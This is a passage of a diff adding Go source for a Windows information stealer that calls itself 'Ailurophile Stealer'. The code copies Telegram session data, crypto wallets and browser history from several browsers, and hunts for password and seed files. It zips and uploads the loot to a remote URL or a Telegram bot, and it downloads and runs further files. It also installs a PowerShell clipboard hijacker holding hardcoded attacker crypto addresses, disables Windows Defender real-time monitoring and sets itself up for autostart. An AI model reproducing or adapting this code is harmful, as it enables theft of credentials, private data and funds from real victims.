+				_, err = io.Copy(zipFileWriter, file)
+				if err != nil {
+					return fmt.Errorf("error writing file to zip: %v", err)
+				}
+
+				totalFilesStolen++
+			}
+
+			return nil
+		})
+
+		if err != nil {
+		}
+	}
+
+	return totalFilesStolen
+}
+func matchesCriteria(filePath string, allowedExtensions []string, files []string) bool {
+	if filepath.Ext(filePath) == "" {
+		return false
+	}
+
+	fileExtension := strings.ToLower(filepath.Ext(filePath)[1:])
+	fileName := strings.ToLower(filepath.Base(filePath))
+
+	if !contains(allowedExtensions, fileExtension) {
+		return false
+	}
+
+	for _, keyword := range files {
+		if strings.Contains(fileName, keyword) {
+			return true
+		}
+	}
+
+	return false
+}
+func contains(slice []string, item string) bool {
+	for _, s := range slice {
+		if s == item {
+			return true
+		}
+	}
+	return false
+}
+func isDirectory(path string) bool {
+	info, err := os.Stat(path)
+	if err != nil {
+		return false
+	}
+	return info.IsDir()
+}
+func submitTelegram(mainpath string) bool {
+	sourcePath := filepath.Join(os.Getenv("APPDATA"), "Telegram Desktop", "tdata")
+	if _, err := os.Stat(sourcePath); os.IsNotExist(err) {
+		return false
+	}
+
+	destinationPath := filepath.Join(mainpath, "Telegram")
+	if _, err := os.Stat(destinationPath); os.IsNotExist(err) {
+		if err := os.MkdirAll(destinationPath, 0777); err != nil {
+			return false
+		}
+	}
+
+	blacklistFolders := []string{"emoji", "user_data", "user_data#2", "user_data#3", "user_data#4", "user_data#5"}
+
+	files, err := os.ReadDir(sourcePath)
+	if err != nil {
+		return false
+	}
+
+	for _, file := range files {
+		if file.Name() == "." || file.Name() == ".." {
+			continue
+		}
+
+		if !contains(blacklistFolders, file.Name()) {
+			sourceItemPath := filepath.Join(sourcePath, file.Name())
+			targetItemPath := filepath.Join(destinationPath, file.Name())
+
+			if file.IsDir() {
+				if err := os.MkdirAll(targetItemPath, 0777); err != nil {
+					continue
+				}
+				copyFolderContents(sourceItemPath, targetItemPath)
+			} else {
+				if err := copyFile(sourceItemPath, targetItemPath); err != nil {
+					continue
+				}
+			}
+		}
+	}
+
+	return true
+}
+func copyFolderContents(src, dst string) {
+	entries, err := os.ReadDir(src)
+	if err != nil {
+		return
+	}
+
+	for _, entry := range entries {
+		srcPath := filepath.Join(src, entry.Name())
+		dstPath := filepath.Join(dst, entry.Name())
+
+		if entry.IsDir() {
+			if err := os.MkdirAll(dstPath, 0777); err != nil {
+				continue
+			}
+			copyFolderContents(srcPath, dstPath)
+		} else {
+			if err := copyFile(srcPath, dstPath); err != nil {
+				continue
+			}
+		}
+	}
+}
+func localWalletData(mainFolderPath string, wallets map[string]string) int {
+	walletsDestination := filepath.Join(mainFolderPath, "Wallets")
+
+	if _, err := os.Stat(walletsDestination); os.IsNotExist(err) {
+		if err := os.MkdirAll(walletsDestination, 0777); err != nil {
+			return 0
+		}
+	}
+	for walletName, walletSourcePath := range wallets {
+		if _, err := os.Stat(walletSourcePath); os.IsNotExist(err) {
+			continue
+		}
+		walletDestination := filepath.Join(walletsDestination, walletName)
+
+		if _, err := os.Stat(walletDestination); os.IsNotExist(err) {
+			if err := os.MkdirAll(walletDestination, 0777); err != nil {
+				continue
+			}
+		}
+		if err := copyFolder(walletSourcePath, walletDestination); err != nil {
+			continue
+		}
+	}
+
+	return 1
+}
+func ailurophileEncrypt(data, key string) string {
+	keyLength := len(key)
+	dataLength := len(data)
+	encryptedData := make([]byte, dataLength)
+
+	for i := 0; i < dataLength; i++ {
+		encryptedData[i] = byte((int(data[i]) + int(key[i%keyLength])) % 256)
+	}
+
+	return base64.StdEncoding.EncodeToString(encryptedData)
+}
+func zipFolder(source, destination string) error {
+	if _, err := os.Stat(source); os.IsNotExist(err) {
+		return fmt.Errorf("source folder does not exist: %s", source)
+	}
+
+	zipFile, err := os.Create(destination)
+	if err != nil {
+		return fmt.Errorf("could not create archive: %v", err)
+	}
+	defer zipFile.Close()
+
+	zipWriter := zip.NewWriter(zipFile)
+	defer zipWriter.Close()
+
+	sourcePath := filepath.Base(source)
+	err = filepath.Walk(source, func(path string, info os.FileInfo, err error) error {
+		if err != nil {
+			return err
+		}
+
+		relativePath := filepath.Join(sourcePath, path[len(source):])
+
+		if info.IsDir() {
+			_, err := zipWriter.Create(relativePath + "/")
+			if err != nil {
+				return err
+			}
+		} else {
+			fileToZip, err := os.Open(path)
+			if err != nil {
+				return err
+			}
+			defer fileToZip.Close()
+
+			zipFileWriter, err := zipWriter.Create(relativePath)
+			if err != nil {
+				return err
+			}
+
+			_, err = io.Copy(zipFileWriter, fileToZip)
+			if err != nil {
+				return err
+			}
+		}
+
+		return nil
+	})
+
+	return err
+}
+func uploadFileZip(zipFilePath, uploadUrl string) (string, error) {
+	file, err := os.Open(zipFilePath)
+	if err != nil {
+		return "", fmt.Errorf("error opening file: %v", err)
+	}
+	defer file.Close()
+
+	body := &bytes.Buffer{}
+	writer := multipart.NewWriter(body)
+	part, err := writer.CreateFormFile("file", filepath.Base(zipFilePath))
+	if err != nil {
+		return "", fmt.Errorf("error creating form file: %v", err)
+	}
+	_, err = io.Copy(part, file)
+	if err != nil {
+		return "", fmt.Errorf("error copying file data: %v", err)
+	}
+
+	err = writer.Close()
+	if err != nil {
+		return "", fmt.Errorf("error closing writer: %v", err)
+	}
+
+	req, err := http.NewRequest("POST", uploadUrl, body)
+	if err != nil {
+		return "", fmt.Errorf("error creating request: %v", err)
+	}
+	req.Header.Set("Content-Type", writer.FormDataContentType())
+
+	client := &http.Client{}
+	resp, err := client.Do(req)
+	if err != nil {
+		return "", fmt.Errorf("error making request: %v", err)
+	}
+	defer resp.Body.Close()
+
+	respBody, err := io.ReadAll(resp.Body)
+	if err != nil {
+		return "", fmt.Errorf("error reading response body: %v", err)
+	}
+
+	if resp.StatusCode != http.StatusOK {
+		return "", fmt.Errorf("upload failed: %s", resp.Status)
+	}
+
+	return string(respBody), nil
+}
+func getHistory(browserPaths [][]string, mainFolderPath string) int {
+	totalHistoryEntries := 0 
+
+	for _, path := range browserPaths {
+		historyEntries := []string{}
+		if _, err := os.Stat(path[0]); os.IsNotExist(err) {
+			continue
+		}
+
+		appName := getFolderNameAfterAppData(path[0])
+
+		historyDataPath := filepath.Join(path[0], "History")
+		historyDbPath := filepath.Join(path[0], "history.db")
+
+		if _, err := os.Stat(historyDataPath); os.IsNotExist(err) {
+			continue
+		}
+
+		err := copyFile(historyDataPath, historyDbPath)
+		if err != nil {
+			continue
+		}
+
+		db, err := sql.Open("sqlite3", historyDbPath)
+		if err != nil {
+			continue
+		}
+		defer db.Close()
+
+		query := "SELECT url, title, visit_count, last_visit_time FROM urls"
+		rows, err := db.Query(query)
+		if err != nil {
+			continue
+		}
+		defer rows.Close()
+
+		for rows.Next() {
+			var url, title string
+			var visitCount int
+			var lastVisitTime int64
+			if err := rows.Scan(&url, &title, &visitCount, &lastVisitTime); err != nil {
+				continue
+			}
+
+			if url == "" {
+				continue
+			}
+
+			lastVisitTime = (lastVisitTime / 1000000) - 11644473600
+			dateVisited := time.Unix(lastVisitTime, 0).Format("2006-01-02 15:04:05")
+
+			historyEntries = append(historyEntries, fmt.Sprintf("================\nURL: %s\nTitle: %s\nVisit Count: %d\nLast Visit Time: %s\nApplication: %s %s\n", url, title, visitCount, dateVisited, appName, path[1]))
+			totalHistoryEntries++ // Tăng biến đếm khi tìm thấy lịch sử
+		}
+
+		if len(historyEntries) == 0 {
+			historyEntries = append(historyEntries, "No history found")
+		}
+
+		if len(historyEntries) > 0 {
+			historyFolderPath := filepath.Join(mainFolderPath, "History")
+			nameFile := fmt.Sprintf("%s-%s.txt", appName, path[1])
+			if _, err := os.Stat(historyFolderPath); os.IsNotExist(err) {
+				err := os.MkdirAll(historyFolderPath, 0777)
+				if err != nil {
+					continue
+				}
+			}
+
+			historyFilePath := filepath.Join(historyFolderPath, nameFile)
+
+
+			if _, err := os.Stat(historyFilePath); err == nil {
+				err := os.Remove(historyFilePath)
+				if err != nil {
+					continue
+				}
+			}
+
+
+			err := os.WriteFile(historyFilePath, []byte("Ailurophile Stealer - Telegram: @Ailurophilevn\n\n"+fmt.Sprint(historyEntries)), 0644)
+			if err != nil {
+				continue
+			}
+		}
+	}
+
+
+	return totalHistoryEntries
+}
+func sendToTelegram(botToken, chatID, message string) (string, error) {
+	telegramURL := fmt.Sprintf("https://api.telegram.org/bot%s/sendMessage", botToken)
+
+	data := url.Values{}
+	data.Set("chat_id", chatID)
+	data.Set("text", message)
+	data.Set("parse_mode", "HTML")
+
+	req, err := http.NewRequest("POST", telegramURL, bytes.NewBufferString(data.Encode()))
+	if err != nil {
+		return "", fmt.Errorf("failed to create request: %v", err)
+	}
+	req.Header.Add("Content-Type", "application/x-www-form-urlencoded")
+
+	client := &http.Client{}
+	resp, err := client.Do(req)
+	if err != nil {
+		return "", fmt.Errorf("failed to send request: %v", err)
+	}
+	defer resp.Body.Close()
+
+	buf := new(bytes.Buffer)
+	buf.ReadFrom(resp.Body)
+	response := buf.String()
+
+	if resp.StatusCode != http.StatusOK {
+		return response, fmt.Errorf("telegram API request failed with status: %s", resp.Status)
+	}
+
+	return response, nil
+}
+func deleteFile(filePath string) {
+	if _, err := os.Stat(filePath); err == nil {
+		err := os.Remove(filePath)
+		if err != nil {
+		}
+	} else {
+	}
+}
+func deleteFolder(folderPath string) {
+	if _, err := os.Stat(folderPath); err == nil {
+
+		err := filepath.Walk(folderPath, func(path string, info os.FileInfo, err error) error {
+			if err != nil {
+				return err
+			}
+			if !info.IsDir() {
+				return os.Remove(path)
+			}
+			return nil
+		})
+		if err != nil {
+			return
+		}
+
+
+		err = os.RemoveAll(folderPath)
+		if err != nil {
+		} else {
+		}
+	} else {
+	}
+}
+func runClipper() {
+
+	scriptsPath := filepath.Join(os.Getenv("LOCALAPPDATA"), "Updater")
+
+	if _, err := os.Stat(scriptsPath); os.IsNotExist(err) {
+		err := os.MkdirAll(scriptsPath, os.ModePerm)
+		if err != nil {
+			return
+		}
+	} else {
+	}
+
+
+	powershellScriptContent := `
+$sctpth = $MyInvocation.MyCommand.Path
+$ran = -join ((65..90) + (97..122) | Get-Random -Count 15 | ForEach-Object {[char]$_})
+$ranpth = if ((Get-Random) % 2) { Join-Path $env:TEMP "$ran.ps1" } else { Join-Path $env:APPDATA "$ran.ps1" }
+Copy-Item -Path $sctpth -Destination $ranpth -Force
+Remove-Item -Path $sctpth -Force
+
+$key = "HKCU:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"
+$valn = "Powershell"
+$val = """powershell.exe"" -WindowStyle Hidden -ExecutionPolicy Bypass -File ""$ranpth"""
+
+if (!(Test-Path $key)) {
+    New-Item -Path $key -Force | Out-Null
+}
+
+Set-ItemProperty -Path $key -Name $valn -Value $val
+
+Add-Type -Name Window -Namespace Console -MemberDefinition '
+[DllImport("Kernel32.dll")]
+public static extern IntPtr GetConsoleWindow();
+[DllImport("user32.dll")]
+public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
+public static void Hide()
+{
+    IntPtr hWnd = GetConsoleWindow();
+    if(hWnd != IntPtr.Zero)
+    {
+        ShowWindow(hWnd, 0);
+    }
+}
+'
+[Console.Window]::Hide()
+
+$attr = [System.IO.FileAttributes]::Hidden
+Set-ItemProperty -Path $ranpth -Name Attributes -Value $attr
+
+$addy = @{
+    "btc" = "1CHW8tEXfuHUcbqxy8rp9Qors41QWHzGxB"
+    "eth" = "0xACD492528322728C9A399215C4a8887406e6aFba"
+    "ltc" = "LLqgBCXvyXfgQmUbuo59pEGFvVAtfJvteJ"
+    "trx" = "TB3X9o1ipbKm7zTg7FHh3dv5nDCiJH8yZK"
+    "bch" = "bitcoincash:qq922a722rc7y80s0gznzxjlyd7qq66gkgl3d6jra0"
+    "xmr" = "434nzBy7Ux5D2kLsQxokiC8HYX5PycGLQ71Zk4TL9PM4Qq1obDaeQwoUMLL32K7PwqR1z8DuF6B8taBQwCu7MDTd92G1Whm"
+    "xrp" = "rnoYtpydJBwNwoiZ4ca84PECb4rCQ8eV9L"
+    "zcash" = "t1eUBFE2GBk7FMADywSoR7YqWDJkKofej9p"
+    "doge" = "D9DwMyvN1aXviZMAuqDZDoC4iyttWZSJfr"
+	"usdt" = "0xACD492528322728C9A399215C4a8887406e6aFba"
+}
+
+while ($true) {
+    $clipper = Get-Clipboard
+	if ($clipper -match "^(1|3|bc1)[a-zA-HJ-NP-Z0-9]{26,41}$") {
+		$clipper = $addy["btc"]
+		[System.Windows.Forms.Clipboard]::SetText($clipper)
+	}
+    elseif ($clipper -match "^0x[a-fA-F0-9]{40}$") {
+        $clipper = $addy["eth"]
+        [System.Windows.Forms.Clipboard]::SetText($clipper)
+    }
+    elseif ($clipper -match "^(L|M|3|ltc1)[a-km-zA-HJ-NP-Z1-9]{26,33}$") {
+        $clipper = $addy["ltc"]
+        [System.Windows.Forms.Clipboard]::SetText($clipper)
+    }
+	elseif ($clipper -match "^(T|t)[a-zA-HJ-NP-Z0-9]{33}$") {
+		$clipper = $addy["usdt"]
+		[System.Windows.Forms.Clipboard]::SetText($clipper)
+	}
+    elseif ($clipper -match "^T[a-zA-Z0-9]{28,33}$") {
+        $clipper = $addy["trx"]
+        [System.Windows.Forms.Clipboard]::SetText($clipper)
+    }
+    elseif ($clipper -match "^((bitcoincash:)?(q|p)[a-z0-9]{41})$") {
+        $clipper = $addy["bch"]
+        [System.Windows.Forms.Clipboard]::SetText($clipper)
+    }
+    elseif ($clipper -match "^4[0-9AB][1-9A-HJ-NP-Za-km-z]{92,95}$") {
+        $clipper = $addy["xmr"]
+        [System.Windows.Forms.Clipboard]::SetText($clipper)
+    }
+    elseif ($clipper -match "^(?:^r[0-9a-zA-Z]{24,34}$)") {
+        $clipper = $addy["xrp"]
+        [System.Windows.Forms.Clipboard]::SetText($clipper)
+    }
+    elseif ($clipper -match "^t1[0-9A-z]{32,39}$") {
+        $clipper = $addy["zcash"]
+        [System.Windows.Forms.Clipboard]::SetText($clipper)
+    }
+    elseif ($clipper -match "^{1}[5-9A-HJ-NP-U]{1}[1-9A-HJ-NP-Za-km-z]{32,61}$") {
+        $clipper = $addy["doge"]
+        [System.Windows.Forms.Clipboard]::SetText($clipper)
+    }
+    Start-Sleep -Milliseconds 500
+}`
+
+
+	scriptFilePath := filepath.Join(scriptsPath, "script.ps1")
+
+	err := os.WriteFile(scriptFilePath, []byte(powershellScriptContent), os.ModePerm)
+	if err != nil {
+		return
+	}
+
+	cmd := exec.Command("powershell", "-ExecutionPolicy", "Bypass", "-File", scriptFilePath)
+	err = cmd.Run()
+	if err != nil {
+		return
+	}
+}
+
+func regEdit(regPath, name, value string) error {
+	// Lệnh PowerShell để chạy lệnh reg add với quyền admin (RunAs)
+	command := fmt.Sprintf("Start-Process 'powershell' -ArgumentList 'reg add \"%s\" /v %s /t REG_DWORD /d %s /f' -Verb RunAs", regPath, name, value)
+	
+	// Tạo và thực thi command
+	cmd := exec.Command("powershell", "-Command", command)
+
+	// Ẩn cửa sổ PowerShell khi chạy trên Windows
+	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
+
+	err := cmd.Run()
+	if err != nil {
+		return err
+	}
+
+	fmt.Printf("Successfully updated registry: %s\\%s\n", regPath, name)
+	return nil
+}
+func randomString(length int) (string, error) {
+	const charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
+	result := make([]byte, length)
+	for i := range result {
+		num, err := rand.Int(rand.Reader, big.NewInt(int64(len(charset))))
+		if err != nil {
+			return "", err
+		}
+		result[i] = charset[num.Int64()]
+	}
+	return string(result), nil
+}
+// Hàm chạy lệnh PowerShell và trả về output
+func runPS(args string) (string, error) {
+	cmd := exec.Command("powershell", "-Command", args)
+	
+	// Ẩn cửa sổ PowerShell khi chạy trên Windows
+	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
+
+	output, err := cmd.Output()
+	if err != nil {
+		return "", err
+	}
+	return string(output), nil
+}
+
+// DownloadFile tải file từ URL và lưu vào đường dẫn cục bộ.
+func DownloadFile(url, filepath string) error {
+	// Tạo request tải file
+	resp, err := http.Get(url)
+	if err != nil {
+		return err
+	}
+	defer resp.Body.Close()
+
+	// Tạo file để lưu dữ liệu tải về
+	out, err := os.Create(filepath)
+	if err != nil {
+		return err
+	}
+	defer out.Close()
+
+	// Sao chép nội dung từ response vào file
+	_, err = io.Copy(out, resp.Body)
+	if err != nil {
+		return err
+	}
+
+	return nil
+}
+
+// ExecuteFile thực thi file .exe sau khi đã tải về.
+func ExecuteFile(filepath string) error {
+	cmd := exec.Command(filepath)
+	cmd.Stdout = os.Stdout
+	cmd.Stderr = os.Stderr
+
+	return cmd.Run()
+}
+
+func DisableWD() {
+//regEdit("HKLM\\SOFTWARE\\Microsoft\\Windows Defender\\Features", "TamperProtection", "0")
+	//regEdit("HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender", "DisableAntiSpyware", "1")
+	//regEdit("HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection", "DisableBehaviorMonitoring", "1")
+	//regEdit("HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection", "DisableOnAccessProtection", "1")
+	//regEdit("HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection", "DisableScanOnRealtimeEnable", "1")
+	args2 := "Get-MpPreference -verbose"
+	output, err := runPS(args2)
+	if err != nil {
+	}
+
+	settings := []string{
+		"DisableRealtimeMonitoring",
+		/*"DisableBehaviorMonitoring",
+		"DisableBlockAtFirstSeen",
+		"DisableIOAVProtection",
+		"DisablePrivacyMode",
+		"SignatureDisableUpdateOnStartupWithoutEngine",
+		"DisableArchiveScanning",
+		"DisableIntrusionPreventionSystem",
+		"DisableScriptScanning",
+		"SubmitSamplesConsent",
+		"MAPSReporting",
+		"HighThreatDefaultAction",
+		"ModerateThreatDefaultAction",
+		"LowThreatDefaultAction",
+		"SevereThreatDefaultAction",*/
+	}
+	commands := map[string]string{
+		"DisableRealtimeMonitoring":              "Set-MpPreference -DisableRealtimeMonitoring $true",
+		/*"DisableBehaviorMonitoring":              "Set-MpPreference -DisableBehaviorMonitoring $true",
+		"DisableBlockAtFirstSeen":                "Set-MpPreference -DisableBlockAtFirstSeen $true",
+		"DisableIOAVProtection":                  "Set-MpPreference -DisableIOAVProtection $true",
+		"DisablePrivacyMode":                     "Set-MpPreference -DisablePrivacyMode $true",
+		"SignatureDisableUpdateOnStartupWithoutEngine": "Set-MpPreference -SignatureDisableUpdateOnStartupWithoutEngine $true",
+		"DisableArchiveScanning":                 "Set-MpPreference -DisableArchiveScanning $true",
+		"DisableIntrusionPreventionSystem":       "Set-MpPreference -DisableIntrusionPreventionSystem $true",
+		"DisableScriptScanning":                  "Set-MpPreference -DisableScriptScanning $true",
+		"SubmitSamplesConsent":                   "Set-MpPreference -SubmitSamplesConsent 2",
+		"MAPSReporting":                          "Set-MpPreference -MAPSReporting 0",
+		"HighThreatDefaultAction":                "Set-MpPreference -HighThreatDefaultAction 6 -Force",
+		"ModerateThreatDefaultAction":            "Set-MpPreference -ModerateThreatDefaultAction 6",
+		"LowThreatDefaultAction":                 "Set-MpPreference -LowThreatDefaultAction 6",
+		"SevereThreatDefaultAction":              "Set-MpPreference -SevereThreatDefaultAction 6",*/
+	}
+	for _, setting := range settings {
+		if strings.Contains(output, setting) && strings.Contains(output, "False") {
+			if command, exists := commands[setting]; exists {
+				runPS(command)
+			}
+		}
+	}
+
+}
+
+
+func copySelfToLocalApp() (string, error) {
+	currentPath, err := os.Executable()
+	if err != nil {
+	}
+	destinationPath := filepath.Join(os.Getenv("APPDATA"), "startup.exe")
+	sourceFile, err := os.Open(currentPath)
+	if err != nil {
+	}
+	defer sourceFile.Close()
+	destFile, err := os.Create(destinationPath)
+	if err != nil {
+	}
+	defer destFile.Close()
+	_, err = io.Copy(destFile, sourceFile)
+	if err != nil {
+	}
+
+	return destinationPath, nil
+}
+
+
+func setAutoStartup(exePath string) error {
+	command := fmt.Sprintf("Start-Process 'powershell' -ArgumentList 'reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v MyApp /t REG_SZ /d \"%s\" /f' -Verb RunAs", exePath)
+	cmd := exec.Command("powershell", "-Command", command)
+	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
+	err := cmd.Run()
+	if err != nil {
+		//return fmt.Errorf("Không thể thêm vào auto startup: %v", err)
+	}
+
+	return nil
+}
+
+
+
+func main() {
+	ipInfo, err := getIP()
+	if err != nil {
+		return
+	}
+	if checkBlacklistedIP(ipInfo["ip"].(string)) ||
+		checkBlacklistedHostname() ||
+		checkBlacklistedUsername() ||
+		checkBlacklistedGPU() ||
+		checkBlacklistedOS() ||
+		checkBlacklistedProcesses() {
+		//os.Exit(1)
+	}
+
+	configJSON := `{"PayloadCrypted_url":"","key_decrypt":"","Telegram_token":"","Chat_id":"","upload_url":"","Delivery":"0","Stub_url":"","user_id":"","welcome":"","Startup":"0"}`
+	var config Config
+	if err := json.Unmarshal([]byte(configJSON), &config); err != nil {
+		return
+	}
+		hostname, err := hostname()
+	if err != nil {
+		return
+	}
+
+	pcType, err := pcType()
+	if err != nil {
+		return
+	}
+		mac, err := getMACAddress()
+	if err != nil {
+		log.Fatalf("Error: %v", err)
+	}
+		arch := arch()
+	filePath := filePath()
+	mainPath := filepath.Join(os.Getenv("LOCALAPPDATA"), "Ailurophile")
+
+	allowedExtensions := []string{"rdp", "txt", "doc", "docx", "pdf", "csv", "xls", "xlsx", "keys", "ldb", "log"}
+	foldersToSearch := []string{"Documents", "Desktop", "Downloads"}
+	files := []string{"secret", "password", "account", "tax", "key", "wallet", "gang", "default", "backup", "passw", "mdp", "motdepasse", "acc", "mot_de_passe", "login", "secret", "bot", "atomic", "account", "acount", "paypal", "banque", "bot", "metamask", "wallet", "crypto", "exodus", "discord", "2fa", "code", "memo", "compte", "token", "backup", "secret", "seed", "mnemonic", "memoric", "private", "key", "passphrase", "pass", "phrase", "steal", "bank", "info", "casino", "prv", "privé", "prive", "telegram", "identifiant", "identifiants", "personnel", "trading", "bitcoin", "sauvegarde", "funds", "recup", "note"}
+	browserPaths := [][]string{
+		{filepath.Join(os.Getenv("LOCALAPPDATA"), "Google\\Chrome\\User Data\\Default\\"), "Default", filepath.Join(os.Getenv("LOCALAPPDATA"), "Google\\Chrome\\User Data\\")},
+		{filepath.Join(os.Getenv("LOCALAPPDATA"), "Google\\Chrome\\User Data\\Profile 1\\"), "Profile_1", filepath.Join(os.Getenv("LOCALAPPDATA"), "Google\\Chrome\\User Data\\")},
+		{filepath.Join(os.Getenv("LOCALAPPDATA"), "Google\\Chrome\\User Data\\Profile 2\\"), "Profile_2", filepath.Join(os.Getenv("LOCALAPPDATA"), "Google\\Chrome\\User Data\\")},
+		{filepath.Join(os.Getenv("LOCALAPPDATA"), "Google\\Chrome\\User Data\\Profile 3\\"), "Profile_3", filepath.Join(os.Getenv("LOCALAPPDATA"), "Google\\Chrome\\User Data\\")},
+		{filepath.Join(os.Getenv("LOCALAPPDATA"), "Google\\Chrome\\User Data\\Profile 4\\"), "Profile_4", filepath.Join(os.Getenv("LOCALAPPDATA"), "Google\\Chrome\\User Data\\")},
+		{filepath.Join(os.Getenv("LOCALAPPDATA"), "Google\\Chrome\\User Data\\Profile 5\\"), "Profile_5", filepath.Join(os.Getenv("LOCALAPPDATA"), "Google\\Chrome\\User Data\\")},
+		{filepath.Join(os.Getenv("LOCALAPPDATA"), "BraveSoftware\\Brave-Browser\\User Data\\Default\\"), "Default", filepath.Join(os.Getenv("LOCALAPPDATA"), "BraveSoftware\\Brave-Browser\\User Data\\")},
+		{filepath.Join(os.Getenv("LOCALAPPDATA"), "BraveSoftware\\Brave-Browser\\User Data\\Profile 1\\"), "Profile_1", filepath.Join(os.Getenv("LOCALAPPDATA"), "BraveSoftware\\Brave-Browser\\User Data\\")},
+		{filepath.Join(os.Getenv("LOCALAPPDATA"), "BraveSoftware\\Brave-Browser\\User Data\\Profile 2\\"), "Profile_2", filepath.Join(os.Getenv("LOCALAPPDATA"), "BraveSoftware\\Brave-Browser\\User Data\\")},
+		{filepath.Join(os.Getenv("LOCALAPPDATA"), "BraveSoftware\\Brave-Browser\\User Data\\Profile 3\\"), "Profile_3", filepath.Join(os.Getenv("LOCALAPPDATA"), "BraveSoftware\\Brave-Browser\\User Data\\")},
+		{filepath.Join(os.Getenv("LOCALAPPDATA"), "BraveSoftware\\Brave-Browser\\User Data\\Profile 4\\"), "Profile_4", filepath.Join(os.Getenv("LOCALAPPDATA"), "BraveSoftware\\Brave-Browser\\User Data\\")},
+		{filepath.Join(os.Getenv("LOCALAPPDATA"), "BraveSoftware\\Brave-Browser\\User Data\\Profile 5\\"), "Profile_5", filepath.Join(os.Getenv("LOCALAPPDATA"), "BraveSoftware\\Brave-Browser\\User Data\\")},
+		{filepath.Join(os.Getenv("LOCALAPPDATA"), "BraveSoftware\\Brave-Browser\\User Data\\Guest Profile\\"), "Guest Profile", filepath.Join(os.Getenv("LOCALAPPDATA"), "BraveSoftware\\Brave-Browser\\User Data\\")},
+		{filepath.Join(os.Getenv("LOCALAPPDATA"), "Yandex\\YandexBrowser\\User Data\\Default\\"), "Default", filepath.Join(os.Getenv("LOCALAPPDATA"), "Yandex\\YandexBrowser\\User Data\\")},
+		{filepath.Join(os.Getenv("LOCALAPPDATA"), "Yandex\\YandexBrowser\\User Data\\Profile 1\\"), "Profile_1", filepath.Join(os.Getenv("LOCALAPPDATA"), "Yandex\\YandexBrowser\\User Data\\")},
+		{filepath.Join(os.Getenv("LOCALAPPDATA"), "Yandex\\YandexBrowser\\User Data\\Profile 2\\"), "Profile_2", filepath.Join(os.Getenv("LOCALAPPDATA"), "Yandex\\YandexBrowser\\User Data\\")},
+		{filepath.Join(os.Getenv("LOCALAPPDATA"), "Yandex\\YandexBrowser\\User Data\\Profile 3\\"), "Profile_3", filepath.Join(os.Getenv("LOCALAPPDATA"), "Yandex\\YandexBrowser\\User Data\\")},
+		{filepath.Join(os.Getenv("LOCALAPPDATA"), "Yandex\\YandexBrowser\\User Data\\Profile 4\\"), "Profile_4", filepath.Join(os.Getenv("LOCALAPPDATA"), "Yandex\\YandexBrowser\\User Data\\")},
+		{filepath.Join(os.Getenv("LOCALAPPDATA"), "Yandex\\YandexBrowser\\User Data\\Profile 5\\"), "Profile_5", filepath.Join(os.Getenv("LOCALAPPDATA"), "Yandex\\YandexBrowser\\User Data\\")},
+		{filepath.Join(os.Getenv("LOCALAPPDATA"), "Yandex\\YandexBrowser\\User Data\\Guest Profile\\"), "Guest Profile", filepath.Join(os.Getenv("LOCALAPPDATA"), "Yandex\\YandexBrowser\\User Data\\")},
+		{filepath.Join(os.Getenv("LOCALAPPDATA"), "Microsoft\\Edge\\User Data\\Default\\"), "Default", filepath.Join(os.Getenv("LOCALAPPDATA"), "Microsoft\\Edge\\User Data\\")},
+		{filepath.Join(os.Getenv("LOCALAPPDATA"), "Microsoft\\Edge\\User Data\\Profile 1\\"), "Profile_1", filepath.Join(os.Getenv("LOCALAPPDATA"), "Microsoft\\Edge\\User Data\\")},
+		{filepath.Join(os.Getenv("LOCALAPPDATA"), "Microsoft\\Edge\\User Data\\Profile 2\\"), "Profile_2", filepath.Join(os.Getenv("LOCALAPPDATA"), "Microsoft\\Edge\\User Data\\")},
+		{filepath.Join(os.Getenv("LOCALAPPDATA"), "Microsoft\\Edge\\User Data\\Profile 3\\"), "Profile_3", filepath.Join(os.Getenv("LOCALAPPDATA"), "Microsoft\\Edge\\User Data\\")},
+		{filepath.Join(os.Getenv("LOCALAPPDATA"), "Microsoft\\Edge\\User Data\\Profile 4\\"), "Profile_4", filepath.Join(os.Getenv("LOCALAPPDATA"), "Microsoft\\Edge\\User Data\\")},
+		{filepath.Join(os.Getenv("LOCALAPPDATA"), "Microsoft\\Edge\\User Data\\Profile 5\\"), "Profile_5", filepath.Join(os.Getenv("LOCALAPPDATA"), "Microsoft\\Edge\\User Data\\")},
+		{filepath.Join(os.Getenv("LOCALAPPDATA"), "Microsoft\\Edge\\User Data\\Guest Profile\\"), "Guest Profile", filepath.Join(os.Getenv("LOCALAPPDATA"), "Microsoft\\Edge\\User Data\\")},
+		{filepath.Join(os.Getenv("APPDATA"), "Opera Software\\Opera Neon\\User Data\\Default\\"), "Default", filepath.Join(os.Getenv("APPDATA"), "Opera Software\\Opera Neon\\User Data\\")},
+		{filepath.Join(os.Getenv("APPDATA"), "Opera Software\\Opera Stable\\"), "Default", filepath.Join(os.Getenv("APPDATA"), "Opera Software\\Opera Stable\\")},
+		{filepath.Join(os.Getenv("APPDATA"), "Opera Software\\Opera GX Stable\\"), "Default", filepath.Join(os.Getenv("APPDATA"), "Opera Software\\Opera GX Stable\\")},
+		{filepath.Join(os.Getenv("LOCALAPPDATA"), "CocCoc\\Browser\\User Data\\Default\\"), "Default", filepath.Join(os.Getenv("LOCALAPPDATA"), "CocCoc\\Browser\\User Data\\")},
+		{filepath.Join(os.Getenv("LOCALAPPDATA"), "CocCoc\\Browser\\User Data\\Profile 1\\"), "Profile_1", filepath.Join(os.Getenv("LOCALAPPDATA"), "CocCoc\\Browser\\User Data\\")},
+		{filepath.Join(os.Getenv("LOCALAPPDATA"), "CocCoc\\Browser\\User Data\\Profile 2\\"), "Profile_2", filepath.Join(os.Getenv("LOCALAPPDATA"), "CocCoc\\Browser\\User Data\\")},
+		{filepath.Join(os.Getenv("LOCALAPPDATA"), "CocCoc\\Browser\\User Data\\Profile 3\\"), "Profile_3", filepath.Join(os.Getenv("LOCALAPPDATA"), "CocCoc\\Browser\\User Data\\")},
